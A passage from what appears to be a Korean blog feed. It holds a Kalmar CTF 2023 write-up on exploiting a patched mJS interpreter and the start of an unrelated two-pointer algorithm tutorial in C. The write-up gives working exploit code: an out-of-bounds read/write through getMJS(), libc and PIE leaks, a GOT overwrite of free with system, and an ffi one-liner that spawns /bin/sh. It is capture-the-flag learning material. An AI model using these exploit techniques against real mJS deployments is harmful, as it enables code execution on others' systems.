~0, */</span></span><br><span class="line"><span class="addition">+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_cb_free)); */</span></span><br><span class="line"><span class="addition">+  /* mjs_set(mjs, obj, &quot;mkstr&quot;, ~0, */</span></span><br><span class="line"><span class="addition">+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_mkstr)); */</span></span><br><span class="line">   mjs_set(mjs, obj, &quot;getMJS&quot;, ~0,</span><br><span class="line">           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_get_mjs));</span><br><span class="line">   mjs_set(mjs, obj, &quot;die&quot;, ~0,</span><br><span class="line"><span class="meta">@@ -151,8 +151,8 @@</span> void mjs_init_builtin(struct mjs *mjs, mjs_val_t obj) &#123;</span><br><span class="line">           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_do_gc));</span><br><span class="line">   mjs_set(mjs, obj, &quot;chr&quot;, ~0,</span><br><span class="line">           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_chr));</span><br><span class="line"><span class="deletion">-  mjs_set(mjs, obj, &quot;s2o&quot;, ~0,</span></span><br><span class="line"><span class="deletion">-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_s2o));</span></span><br><span class="line"><span class="addition">+  /* mjs_set(mjs, obj, &quot;s2o&quot;, ~0, */</span></span><br><span class="line"><span class="addition">+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_s2o)); */</span></span><br><span class="line"> </span><br><span class="line">   /*</span><br><span class="line">    * Populate JSON.parse() and JSON.stringify()</span><br><span class="line"><span class="comment">diff --git a/src/mjs_exec.c b/src/mjs_exec.c</span></span><br><span class="line"><span class="comment">index bd48fea..24c2c7c 100644</span></span><br><span class="line"><span class="comment">--- a/src/mjs_exec.c</span></span><br><span class="line"><span class="comment">+++ b/src/mjs_exec.c</span></span><br><span class="line"><span class="meta">@@ -835,7 +835,7 @@</span> MJS_PRIVATE mjs_err_t mjs_execute(struct mjs *mjs, size_t off, mjs_val_t *res) &#123;</span><br><span class="line"> </span><br><span class="line">           *func = MJS_UNDEFINED;  // Return value</span><br><span class="line">           // LOG(LL_VERBOSE_DEBUG, (&quot;CALLING  %d&quot;, i + 1));</span><br><span class="line"><span class="deletion">-        &#125; else if (mjs_is_string(*func) || mjs_is_ffi_sig(*func)) &#123;</span></span><br><span class="line"><span class="addition">+        &#125; else if (mjs_is_ffi_sig(*func)) &#123;</span></span><br><span class="line">           /* Call ffi-ed function */</span><br><span class="line"> </span><br><span class="line">           call_stack_push_frame(mjs, bp.start_idx + i, retval_stack_idx);</span><br></pre></td></tr></table></figure><p>Built-in APIÏóêÏÑú <code>ffi</code>, <code>ffi_cb_free</code>, <code>mkstr</code> Í∏∞Îä•ÏùÑ ÏßÄÏõ†Îã§Í≥† Ïù¥Ìï¥ÌñàÎã§. ÏßÄÏõåÏßÑ Í∏∞Îä•Îì§ Ï§ë ÌïòÎÇòÏù∏ <code>ffi</code>Îäî ÏïÑÏ£º Í∞ïÎ†•Ìïú APIÏù¥Îã§. ÏïÑÎûòÏôÄ Í∞ôÏù¥ ÏÇ¨Ïö©Ïù¥ Í∞ÄÎä•ÌïúÎç∞, CÌï®ÏàòÎ•º ÏïÑÎûòÏôÄ Í∞ôÏù¥ ImportÌï¥ÏÑú ÏÇ¨Ïö© Í∞ÄÎä•ÌïòÎã§. Ïù¥Í≤ÉÏùÑ ÏÇ¨Ïö©Ìï† Ïàò ÏûàÏúºÎ©¥ Î∞îÎ°ú <code>system(&#39;/bin/sh\x00&#39;)</code>ÏùÑ Ïã§ÌñâÌï¥Î≤ÑÎ¶¨Î©¥ Îê†ÌÖêÎç∞..</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> f = <span class="title function_">ffi</span>(<span class="string">&#x27;int foo(int)&#x27;</span>);</span><br></pre></td></tr></table></figure><ul><li>Import C function into mJS. See next section.</li></ul><p>ÎùºÎäî ÏÉùÍ∞ÅÏùÑ ÌïòÎ©¥ÏÑú Ïù¥Í≤ÉÏ†ÄÍ≤É ÏΩîÎìúÎ•º ÏûëÏÑ±ÌïòÎã§Í∞Ä ÏïåÍ≤åÎêú ÏÇ¨Ïã§ Îëê Í∞ÄÏßÄÍ∞Ä ÏûàÎã§. ÎØ∏Î¶¨ Ïù¥ÏïºÍ∏∞ÌïòÏûêÎ©¥ OOBÍ∞Ä Î∞úÏÉùÌïúÎã§.</p><h3 id="1"><a href="#1" class="headerlink" title="(1)"></a>(1)</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">getMJS</span>()[<span class="number">0x41414141</span>]; </span><br></pre></td></tr></table></figure><img src="/images/230318-kalmarctf2023-mjs/Screenshot 2023-03-18 at 20.44.28.png" width=800/><br><p>OOBÍ∞Ä Î∞úÏÉùÌï¥ÏÑú ÌÑ∞ÏßÑÎã§. ÌÑ∞ÏßÑ instructionÏùÑ Î≥¥Î©¥ raxÏôÄ rcxÎ•º ÎçîÌïú Ï£ºÏÜåÏóê Ï†ëÍ∑ºÌïòÎ†§Îã§Í∞Ä ÌÑ∞ÏßÑ Í≤ÉÏùÑ Î≥º Ïàò ÏûàÎã§. getMJS Í∞ùÏ≤¥Í∞Ä Í∞ÄÎ¶¨ÌÇ§Îäî Í≥≥ÏùÄ <code>0x005555555812a0</code> Ïù¥Îã§. Ïù¥ Ï£ºÏÜåÎ•º Í∏∞Ï§ÄÏúºÎ°ú ÏõêÌïòÎäî Ï£ºÏÜåÏóê Ï†ëÍ∑ºÌïòÍ±∞ÎÇò Ïì∏ Ïàò ÏûàÎã§. ÌÖåÏä§Ìä∏Î•º ÌïòÎã§Î≥¥Î©¥ OOB readÏôÄ OOB write Î™®Îëê Î∞úÏÉùÌïúÎã§. Solve 2ÏóêÏÑú OOB readÎ•º Ïù¥Ïö©Ìï¥ÏÑú ÌïÑÏöîÌïú Ï£ºÏÜåÎ•º leakÌñàÍ≥†, OOB writeÎ•º Ïù¥Ïö©Ìï¥ÏÑú gotÎ•º ÎçÆÏñ¥ÏÑú Î¨∏Ï†úÎ•º ÏùµÏä§ÌñàÎã§.</p><p>Solve 1ÏóêÏÑúÎäî readÎÇò writeÍ∞Ä Î∞úÏÉùÌïúÎã§Îäî Í≤ÉÏóê ÏßëÏ§ëÌïòÏßÄ ÏïäÍ≥† ÏûÑÏùò Ï£ºÏÜåÏóê Ï†ëÍ∑ºÏù¥ Í∞ÄÎä•ÌïòÎã§Îäî Í≤ÉÎßå ÏÉùÍ∞ÅÌïòÎ©¥ÏÑú ÏÜåÏä§ ÏΩîÎìúÎ•º Î≥¥Í≥† ÌíÄÏù¥Î•º ÏûëÏÑ±ÌñàÎã§.</p><h3 id="2"><a href="#2" class="headerlink" title="(2)"></a>(2)</h3><p>ÏÜåÏä§ ÏΩîÎìúÎ•º Î≥¥Î©¥ÏÑú ÏïåÏïÑÎÇ∏ Í≤ÉÏù¥Îã§.</p><img src="/images/230318-kalmarctf2023-mjs/Screenshot 2023-03-18 at 20.28.08.png" width=600/><br><p>patchÏóêÏÑú Î∂ÑÎ™Ö APIÎßå Ï£ºÏÑùÏ≤òÎ¶¨ ÌñàÎã§. Í∑∏Îü¨Î©¥ Ï†Ä Ìï®ÏàòÎäî Ïñ¥ÎñªÍ≤å Îê†Íπå? Ï†Ä Ìï®ÏàòÎèÑ Î∂ÑÎ™Ö Ïª¥ÌååÏùºÏù¥ ÎêòÏñ¥ÏÑú Î∞îÏù¥ÎÑàÎ¶¨ ÎÇ¥Î∂ÄÏóê Ï°¥Ïû¨Ìï† Í≤ÉÏù¥Í≥† OOBÎ°ú ÏûÑÏùò Ï£ºÏÜåÏóê Ï†ëÍ∑º Í∞ÄÎä•ÌïòÎãàÍπå Ï†Ä Ìï®ÏàòÎ•º Ïã§ÌñâÌï† ÏàòÎèÑ ÏûàÍ≤†Îã§Í≥† ÏÉùÍ∞ÅÌñàÎã§.</p><img src="/images/230318-kalmarctf2023-mjs/Screenshot 2023-03-18 at 20.59.36.png" width=400/><br><h2 id="Solve-1"><a href="#Solve-1" class="headerlink" title="Solve 1"></a>Solve 1</h2><p>ÎÇòÎ®∏ÏßÄÎäî Ïù¥Ï†ú <code>ffi</code> API ÏÇ¨Ïö©Î≤ïÎßå ÏïåÎ©¥ ÎêúÎã§. Ïù¥ Î∂ÄÎ∂ÑÏùÄ mjs Î†àÌè¨Î•º ÏÇ¥Ìé¥Î≥¥Í≥† ÏÇ¨Ïö©Î≤ïÏùÑ ÏùµÌòîÎã§.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> system = (getMJS+<span class="number">0x6a10</span>)(<span class="string">&#x27;int system(char *)&#x27;</span>); <span class="title function_">system</span>(<span class="string">&#x27;/bin/sh\x00&#x27;</span>);</span><br></pre></td></tr></table></figure><p>ÌíÄÎ†§ÏÑú ÎãπÌô©ÌñàÍ≥† ÌíÄÍ≥†ÎÇòÏÑú ÌïòÎ£®Ï¢ÖÏùº Í∏∞Î∂ÑÏù¥ Ï¢ãÏïòÎã§.. „Öé</p><h2 id="Solve-2"><a href="#Solve-2" class="headerlink" title="Solve 2"></a>Solve 2</h2><img src="/images/230318-kalmarctf2023-mjs/Screenshot 2023-03-18 at 21.09.58.png" width=400/><br><p>OOB readÏôÄ writeÎ•º Ïù¥Ïö©Ìï¥ÏÑú ÌïÑÏöîÌïú Ï£ºÏÜåÎ•º leakÌïòÍ≥† gotÎ•º ÎçÆÏñ¥ÏÑú <code>system(&#39;/bin/sh\x00&#39;)</code>Î•º Ïã§ÌñâÏãúÌÇ§Îäî Î∞©Î≤ïÏù¥Îã§.</p><ol><li><p>libc leak</p></li><li><p>environ Ïù¥Ïö©Ìï¥ÏÑú pie leak</p></li></ol><ul><li>Ï≤òÏùåÏóê ÌîÑÎ°úÍ∑∏Îû®Ïù¥ ÏãúÏûëÎêòÎ©¥ MJS Í∞ùÏ≤¥Í∞Ä ÏÉùÍ∏¥Îã§. (<code>0x005555555812a0</code>) <code>getMJS()</code>Î•º Ìò∏Ï∂úÌïòÍ≤å ÎêòÎ©¥ ÌûôÏóê ÏÉàÎ°úÏö¥ Ï£ºÏÜåÍ∞Ä ÏÉùÍ∏∞ÎäîÎç∞ Ï†Ä MJS Í∞ùÏ≤¥Î•º Í∞ÄÎ¶¨ÌÇ®Îã§. Ï∞∏Í≥†Î°ú environÏùÄ stackÏóêÏÑú main ÏïÑÎûò ÏòÅÏó≠ÏùÑ Í∞ÄÎ¶¨ÌÇ®Îã§. Ï¶â, environÏóêÎäî stack Ï£ºÏÜåÍ∞Ä Ï†ÄÏû•ÎêòÏñ¥ ÏûàÎã§. stackÏóêÎäî pie Ï£ºÏÜåÍ∞Ä Ï†ÄÏû•ÎêòÏñ¥ ÏûàÍ∏∞ ÎßàÎ†®Ïù¥Îã§. Ï≤òÏùåÏóê MJS Í∞ùÏ≤¥Î•º Í∞ÄÎ¶¨ÌÇ§Îäî mjsÏôÄ mjs2Î•º ÏÉùÏÑ±ÌñàÎã§. mjs2Í∞Ä Í∞ÄÎ¶¨ÌÇ§Îäî Ï£ºÏÜåÎ•º MJS Í∞ùÏ≤¥Í∞Ä ÏïÑÎãå environÏúºÎ°ú Î≥ÄÍ≤ΩÌïúÎã§. OOB readÎ•º Ïù¥Ïö©Ìï¥ÏÑú environÏóê Ï†ÄÏû•Îêú Ï£ºÏÜåÎ•º Ï∂úÎ†•Ìï† Ïàò ÏûàÎäîÎç∞ Ïù¥ stack Ï£ºÏÜåÏóêÏÑú Ï†ÅÏ†àÌûà offsetÏùÑ Ï°∞Ï†àÌï¥ÏÑú pie baseÎ•º Íµ¨Ìï† Ïàò ÏûàÎã§.</li></ul><ol start="3"><li>freeÏùò gotÎ•º system Ìï®ÏàòÎ°ú ÎçÆÍ∏∞</li></ol><ul><li>ÏïûÏÑú pie leakÏùÑ Ìïú Í≤ÉÍ≥º ÎπÑÏä∑ÌïòÎã§. mjs2Í∞Ä Í∞ÄÎ¶¨ÌÇ§Îäî Ï£ºÏÜåÎ•º free_gotÎ°ú Î≥ÄÍ≤ΩÌïòÍ≥† free_gotÏóê system Ï£ºÏÜåÎ•º Ïì¥Îã§.</li></ul><ol start="4"><li>‚Äò&#x2F;bin&#x2F;sh\x00‚Äô</li></ol><ul><li>system Ìï®ÏàòÎäî Ïù∏ÏûêÍ∞Ä ÌïòÎÇòÎãàÍπå Ï≤´ Î≤àÏß∏ Ïù∏ÏûêÎ•º Ìò∏Ï∂úÌïòÎäî Ìï®ÏàòÎ•º Ï°∞ÏûëÌïòÎäî Í≤ÉÏùÑ Î™©ÌëúÎ°ú ÌïúÎã§. Îëê Í∞ÄÏßÄ Î∞©ÏãùÏùÑ Ï∞æÏïòÎã§. mjsÏùò Built-in API Ï§ë ÌïòÎÇòÏù∏ <code>die</code> Íµ¨ÌòÑ ÎÇ¥Î∂ÄÏóêÏÑú freeÎ•º Ìò∏Ï∂úÌïúÎã§. Ïù¥ Î∞©Î≤ïÏù¥ ÏπúÍµ¨Í∞Ä ÌíÄÏù¥Ìïú Î∞©ÏãùÏù¥Îã§. Í∑∏Î¶¨Í≥† Îã§Ïãú ÌíÄÏù¥ÌïòÎ©¥ÏÑú Îã§Î•∏ Î∞©ÏãùÎèÑ Ï∞æÏïÑÎ¥§Îã§. Îòê Îã§Î•∏ Î∞©ÏãùÏùÄ ÏÜåÏä§ ÏΩîÎìú Ï¥àÎ∞òÏóê <code>//bin/sh</code>Î•º Ï∂îÍ∞ÄÌïòÍ≥† Í∑∏ÎÉ• ÏûêÎ∞îÏä§ÌÅ¨Î¶ΩÌä∏ ÏΩîÎìúÎ•º Ïã§ÌñâÌïúÎã§. mjs Î∞îÏù¥ÎÑàÎ¶¨Ïóê ÏûêÎ∞îÏä§ÌÅ¨Î¶ΩÌä∏ ÏΩîÎìúÎ•º Ï†ÑÎ∂Ä Ïã§ÌñâÌïòÍ≥† Ìïú Ï§ÑÏî© Ìï¥Ï†úÌïòÎäî ÏΩîÎìúÍ∞Ä ÏûàÍ∏∞ ÎïåÎ¨∏Ïóê Ìï¥Îãπ ÌíÄÏù¥Í∞Ä Í∞ÄÎä•ÌïòÎã§.</li></ul><img src="/images/230318-kalmarctf2023-mjs/Screenshot 2023-03-18 at 21.34.16.png" width=600/><br><h3 id="Exploit-Code-1"><a href="#Exploit-Code-1" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//bin/sh</span></span><br><span class="line"><span class="comment">// MJS Í∞ùÏ≤¥ 0x005555555812a0 Î•º Í∞ÄÎ¶¨ÌÇ§Îäî mjsÏôÄ mjs2. </span></span><br><span class="line"><span class="comment">// Î™®Îëê ÌûôÏóê Ï†ÄÏû•Îê®</span></span><br><span class="line"><span class="keyword">let</span> mjs = <span class="title function_">getMJS</span>();</span><br><span class="line"><span class="comment">// let xxx = 0x12345678;</span></span><br><span class="line"><span class="keyword">let</span> mjs2 = <span class="title function_">getMJS</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;mjs:&#x27;</span>, mjs); </span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;mjs2:&#x27;</span>, mjs2);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> libc_leak = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 0x     90</span></span><br><span class="line"><span class="comment">// 0x   5d00</span></span><br><span class="line"><span class="comment">// 0x 180000</span></span><br><span class="line"><span class="comment">// 0x 185d90</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x8</span>; ++i) &#123;</span><br><span class="line">    libc_leak += mjs[<span class="number">0x140</span> + i] &lt;&lt; (i * <span class="number">8</span>);</span><br><span class="line">    <span class="title function_">print</span>(mjs[<span class="number">0x140</span> + i] &lt;&lt; (i * <span class="number">8</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// mjs[0x41414141]; </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> libc_base = libc_leak - <span class="number">0x81d90</span>;</span><br><span class="line"><span class="keyword">let</span> system = libc_base + <span class="number">0x49990</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;libc_base:&#x27;</span>, libc_base);</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;system:&#x27;</span>, system);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">overwrite_mjs2</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">        mjs[<span class="number">0x360</span> + i] = address &amp; <span class="number">0xff</span>;</span><br><span class="line">        <span class="comment">// mjs2[i] = address &amp; 0xff;</span></span><br><span class="line">        address &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read64</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    <span class="title function_">overwrite_mjs2</span>(address);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> retval = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i) &#123;</span><br><span class="line">        retval += mjs2[i] &lt;&lt; (i * <span class="number">8</span>);</span><br><span class="line">        <span class="comment">// retval += mjs[0x360 + i] &lt;&lt; (i * 8);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write64</span>(<span class="params">address, value</span>) &#123;</span><br><span class="line">    <span class="title function_">overwrite_mjs2</span>(address);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">let</span> retval = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i) &#123;</span><br><span class="line">        mjs2[i] = value &amp; <span class="number">0xff</span>;</span><br><span class="line">        value &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// mjs2Í∞Ä MJS Í∞ùÏ≤¥ ÎåÄÏã† environÏùÑ Í∞ÄÎ¶¨ÌÇ§Í≤å Ìï®</span></span><br><span class="line"><span class="keyword">let</span> environ = <span class="title function_">read64</span>(libc_base + <span class="number">0x1e0140</span>);</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;environ value:&#x27;</span>, environ);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> pie_leak = <span class="title function_">read64</span>(environ - <span class="number">0x80</span>);</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;pie_leak:&#x27;</span>, pie_leak);</span><br><span class="line"><span class="keyword">let</span> pie_base = pie_leak - <span class="number">0x10020</span>;</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&#x27;pie_base:&#x27;</span>, pie_base);</span><br><span class="line"></span><br><span class="line"><span class="comment">// mjs2Í∞Ä free_got Í∞ÄÎ¶¨ÌÇ§Í≤å Ìïú Îã§ÏùåÏóê [mjs2]Ïóê system Ï£ºÏÜå Ïì∞Í∏∞</span></span><br><span class="line"><span class="keyword">let</span> free_got = pie_base + <span class="number">0x2c018</span>;</span><br><span class="line"><span class="title function_">write64</span>(free_got, system);</span><br><span class="line"></span><br><span class="line"><span class="comment">// dieÎ•º Ìò∏Ï∂úÌï¥ÏÑú ÌíÄÏù¥ÎèÑ Í∞ÄÎä•</span></span><br><span class="line"><span class="comment">// die(&#x27;/bin/sh\x00&#x27;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// system Ìï®ÏàòÎäî Ïù∏ÏûêÍ∞Ä ÌïòÎÇòÎãàÍπå Ï≤´ Î≤àÏß∏ Ïù∏ÏûêÎ•º Ìò∏Ï∂úÌïòÎäî Ìï®ÏàòÎ•º Ï°∞ÏûëÌïòÎäî Í≤ÉÏùÑ Î™©Ìëú</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Kalmar </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OOB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Algorithm - Two pointers (Baekjoon 2003, 2559 C)</title>
      <link href="/230309-algorithm-two_pointer/"/>
      <url>/230309-algorithm-two_pointer/</url>
      
        <content type="html"><![CDATA[<h2 id="Ìà¨-Ìè¨Ïù∏ÌÑ∞"><a href="#Ìà¨-Ìè¨Ïù∏ÌÑ∞" class="headerlink" title="Ìà¨ Ìè¨Ïù∏ÌÑ∞"></a>Ìà¨ Ìè¨Ïù∏ÌÑ∞</h2><p>Î∞∞Ïó¥Í≥º Í∞ôÏùÄ ÏÑ†ÌòïÏûêÎ£åÍµ¨Ï°∞ÏóêÏÑú ÌäπÏ†ï Î∂ÄÎ∂ÑÏßëÌï©ÏùÑ Îπ†Î•¥Í≤å Ï∞æÏïÑÎÇº Îïå Ïù¥Ïö©ÌïúÎã§. ÏïåÍ≥†Î¶¨Ï¶ò Ïù¥Î¶ÑÏùò Ìè¨Ïù∏ÌÑ∞Îäî Ïã§Ï†úÎ°ú CÏùò Ìè¨Ïù∏ÌÑ∞ Í∞úÎÖêÏù¥ ÏïÑÎãàÎã§. Î∞∞Ïó¥Ïùò Ïù∏Îç±Ïä§ÎùºÍ≥† ÏÉùÍ∞ÅÌïòÏûê. ÌïòÎÇòÏùò Î∞∞Ïó¥ÏùÑ Îëê Í∞úÏùò Ìè¨Ïù∏ÌÑ∞Î•º Ïù¥Ïö©Ìï¥ÏÑú ÌäπÏ†ïÌïú Î∂ÄÎ∂ÑÏùÑ Ï∞æÏïÑÎÇº Ïàò ÏûàÎäî ÏïåÍ≥†Î¶¨Ï¶òÏù¥Îã§.</p><p>ÏãúÍ∞ÑÎ≥µÏû°ÎèÑÎäî O(N)Ïù¥Îã§. Îß§ Î∞òÎ≥µÎßàÎã§ Îëê Ìè¨Ïù∏ÌÑ∞Ïùò ÌïòÎÇòÎäî 1Ïî© Ï¶ùÍ∞ÄÌïòÍ≥†, Îëò Ï§ë ÌïòÎÇòÍ∞Ä Î∞∞Ïó¥Ïùò ÎÅùÏóê ÎèÑÎã¨Ìï¥Ïïº Î¨∏Ï†úÎ•º ÌíÄ Ïàò ÏûàÍ∏∞ ÎïåÎ¨∏Ïù¥Îã§.</p><h2 id="Î∞±Ï§Ä-ÏàòÎì§Ïùò-Ìï©-2-Ïã§Î≤Ñ4"><a href="#Î∞±Ï§Ä-ÏàòÎì§Ïùò-Ìï©-2-Ïã§Î≤Ñ4" class="headerlink" title="Î∞±Ï§Ä - ÏàòÎì§Ïùò Ìï© 2 (Ïã§Î≤Ñ4)"></a>Î∞±Ï§Ä - ÏàòÎì§Ïùò Ìï© 2 (Ïã§Î≤Ñ4)</h2><ul><li><a href="https://www.acmicpc.net/problem/2003">https://www.acmicpc.net/problem/2003</a></li><li>NÍ∞úÏùò ÏàòÎ°ú Îêú ÏàòÏó¥ A[1], A[2], ‚Ä¶, A[N] Ïù¥ ÏûàÎã§. Ïù¥ ÏàòÏó¥Ïùò iÎ≤àÏß∏ ÏàòÎ∂ÄÌÑ∞ jÎ≤àÏß∏ ÏàòÍπåÏßÄÏùò Ìï© A[i] + A[i+1] + ‚Ä¶ + A[j-1] + A[j]Í∞Ä MÏù¥ ÎêòÎäî Í≤ΩÏö∞Ïùò ÏàòÎ•º Íµ¨ÌïòÎäî ÌîÑÎ°úÍ∑∏Îû®<ul><li>ÏûÖÎ†•  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4 2</span><br><span class="line">1 1 1 1</span><br></pre></td></tr></table></figure></li><li>Ï∂úÎ†•  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure></li></ul></li><li>C ÏΩîÎìú<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="type">int</span> arr[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> left = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> right = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (left &lt;= right &amp;&amp; right &lt; n) &#123;</span><br><span class="line">        <span class="keyword">if</span> (sum &gt; m) &#123;</span><br><span class="line">            sum -= arr[++left];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sum &lt; m) &#123;</span><br><span class="line">            sum += arr[++right];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sum == m) &#123;</span><br><span class="line">            cnt++;</span><br><span class="line">            sum += arr[++right];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, cnt);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>nÍ∞úÏùò Ï†ïÏàòÎ°ú Ïù¥Î£®Ïñ¥ÏßÑ ÏàòÏó¥Ïù¥ ÏûàÏùÑ Îïå, Ïó∞ÏÜçÎêú Í∞íÏùò Ìï©Ïù¥ mÏù¥ ÎêòÎäî Í≤ΩÏö∞Ïùò ÏàòÎ•º Íµ¨ÌïòÎäî Î¨∏Ï†úÏù¥Îã§. Ïó∞ÏÜçÎêú Í∞íÏùÑ ÎçîÌïòÎäî Í≤ÉÏù¥ ÌïµÏã¨Ïù¥Í∏∞ ÎïåÎ¨∏Ïù¥Í∏∞ ÎïåÎ¨∏Ïóê Ìà¨ Ìè¨Ïù∏ÌÑ∞ 